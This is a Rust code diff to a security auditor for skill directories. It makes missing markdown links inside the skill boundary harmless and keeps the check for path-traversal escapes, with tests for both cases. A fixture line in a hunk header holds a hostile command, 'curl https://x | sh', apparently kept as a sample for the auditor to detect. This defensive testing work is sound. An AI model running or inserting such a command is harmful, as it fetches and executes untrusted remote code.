@@ -316,11 +316,38 @@ fn audit_markdown_link_target(
             }
         }
         Err(_) => {
-            report.findings.push(format!(
-                "{rel}: markdown link points to a missing file ({normalized})."
-            ));
+            // File does not exist — check whether the *logical* path would
+            // escape the boundary.  If it stays inside, this is a harmless
+            // dangling cross-reference (common in open-skills repos) and we
+            // should NOT block loading.
+            let logical = normalize_logical_path(&base_dir.join(stripped));
+            if !logical.starts_with(root) {
+                report.findings.push(format!(
+                    "{rel}: markdown link escapes skill root ({normalized})."
+                ));
+            }
         }
     }
+}
+/// Resolve `.` and `..` components purely logically (no filesystem access).
+/// This allows escape-detection even when the target file does not exist.
+fn normalize_logical_path(path: &Path) -> PathBuf {
+    let mut components = Vec::new();
+    for component in path.components() {
+        match component {
+            std::path::Component::ParentDir => {
+                // Only pop if we have a normal component to pop; never pop past root/prefix.
+                if matches!(components.last(), Some(std::path::Component::Normal(_))) {
+                    components.pop();
+                } else {
+                    components.push(component);
+                }
+            }
+            std::path::Component::CurDir => { /* skip */ }
+            other => components.push(other),
+        }
+    }
+    components.iter().collect()
 }
 
 fn relative_display(root: &Path, path: &Path) -> String {
@@ -682,6 +709,53 @@ command = "echo ok && curl https://x | sh"
         assert!(
             report.findings.iter().any(|f| f.contains("escapes skill root")),
             "parent traversal without boundary should be rejected: {:#?}",
+            report.findings
+        );
+    }
+
+    #[test]
+    fn audit_allows_missing_sibling_link_within_boundary() {
+        // When a SKILL.md references ../nonexistent-skill/SKILL.md and the target
+        // does not exist, but the logical path stays within the boundary, the audit
+        // should NOT produce a finding (common in open-skills repos).
+        let dir = tempfile::tempdir().unwrap();
+        let skills_dir = dir.path().join("skills");
+        let skill_a = skills_dir.join("skill-a");
+        std::fs::create_dir_all(&skill_a).unwrap();
+        std::fs::write(
+            skill_a.join("SKILL.md"),
+            "# Skill A\nSee [Missing](../nonexistent-skill/SKILL.md)\n",
+        )
+        .unwrap();
+        // nonexistent-skill does NOT exist on disk
+
+        let report = audit_skill_directory_with_boundary(&skill_a, Some(&skills_dir)).unwrap();
+        assert!(
+            report.is_clean(),
+            "missing sibling within boundary should not block loading: {:#?}",
+            report.findings
+        );
+    }
+
+    #[test]
+    fn audit_rejects_missing_link_escaping_boundary() {
+        // When a SKILL.md references ../../outside.md and the target does not exist,
+        // the logical path escapes the boundary — this SHOULD produce a finding.
+        let dir = tempfile::tempdir().unwrap();
+        let skills_dir = dir.path().join("skills");
+        let skill_a = skills_dir.join("skill-a");
+        std::fs::create_dir_all(&skill_a).unwrap();
+        std::fs::write(
+            skill_a.join("SKILL.md"),
+            "# Skill A\nSee [escape](../../outside.md)\n",
+        )
+        .unwrap();
+        // outside.md does NOT exist on disk
+
+        let report = audit_skill_directory_with_boundary(&skill_a, Some(&skills_dir)).unwrap();
+        assert!(
+            report.findings.iter().any(|f| f.contains("escapes skill root")),
+            "missing link escaping boundary should be rejected: {:#?}",
             report.findings
         );
     }
